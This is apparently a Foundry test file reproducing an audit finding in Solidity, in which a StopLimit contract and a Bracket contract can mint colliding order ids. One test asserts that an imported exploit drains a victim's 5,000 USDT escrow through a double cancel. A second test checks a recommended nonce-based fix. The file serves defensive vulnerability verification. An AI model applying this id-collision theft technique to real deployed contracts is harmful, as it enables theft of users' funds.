// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    MockUSDT,
    Bracket,
    StopLimit,
    Victim
} from "./44377-h-7-stoplimit-id-collision-with-bracket-orders-due-to-no-val.sol";

/// Recommended fix: mix the calling contract and a nonce into the id.
/// Bracket and StopLimit then cannot mint the same id, so the fill creates a
/// second bracket order instead of overwriting the first and pushing the id twice.
contract FixedMaster {
    uint256 public nonce;

    function generateOrderId(address sender) external returns (uint96) {
        nonce += 1;
        return uint96(uint256(keccak256(abi.encodePacked(sender, block.timestamp, msg.sender, nonce))));
    }
}

contract Finding44377Test is Test {
    function test_exploit_double_cancel_steals_victim_escrow() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.bracketOrderId(), e.stopOrderId(), "ids did not collide");
        assertEq(e.profit(), 5000e6, "stole 5000 USDT");
        assertEq(e.usdt().balanceOf(address(e)), 20000e6, "attacker did not receive 20000");
        assertEq(e.usdt().balanceOf(address(e.bracket())), 0, "bracket not drained");
        assertEq(e.usdt().balanceOf(address(e.victim())), 0, "victim was paid");
        assertEq(e.bracket().amountInOf(e.victimOrderId()), 5000e6, "victim order erased");
        assertEq(e.bracket().pendingCount(), 1, "victim order not still pending");
    }

    function test_control_distinct_ids_refund_only_what_was_deposited() public {
        MockUSDT usdt = new MockUSDT();
        FixedMaster master = new FixedMaster();
        Bracket bracket = new Bracket(address(master), address(usdt));
        StopLimit stop = new StopLimit(address(master), address(bracket), address(usdt));
        bracket.registerStopLimit(address(stop));
        Victim victim = new Victim();

        usdt.mint(address(victim), 5000e6);
        uint96 victimId = victim.openBracket(bracket, usdt, 5000e6);

        usdt.mint(address(this), 15000e6);
        usdt.approve(address(bracket), 5000e6);
        uint96 bracketId = bracket.createOrder(5000e6, address(this));
        usdt.approve(address(stop), 10000e6);
        uint96 stopId = stop.createOrder(10000e6, address(this));

        assertTrue(bracketId != stopId, "ids still collide");
        stop.performUpkeep();

        assertEq(bracket.pendingCount(), 3, "fill did not open a distinct order");
        assertEq(bracket.amountInOf(bracketId), 5000e6, "bracket order was overwritten");
        assertEq(bracket.amountInOf(stopId), 10000e6, "stop fill missing");
        assertEq(bracket.copiesOf(bracketId), 1, "bracket id was duplicated");

        bracket.cancelOrder(bracketId);
        bracket.cancelOrder(stopId);
        assertEq(usdt.balanceOf(address(this)), 15000e6, "attacker profited");
        assertEq(usdt.balanceOf(address(bracket)), 5000e6, "victim escrow not intact");

        vm.expectRevert(bytes("Order not active"));
        bracket.cancelOrder(bracketId);

        vm.prank(address(victim));
        bracket.cancelOrder(victimId);
        assertEq(usdt.balanceOf(address(victim)), 5000e6, "victim not made whole");
        assertEq(usdt.balanceOf(address(this)), 15000e6, "attacker balance moved");
        assertEq(usdt.balanceOf(address(bracket)), 0, "dust left in bracket");
    }
}
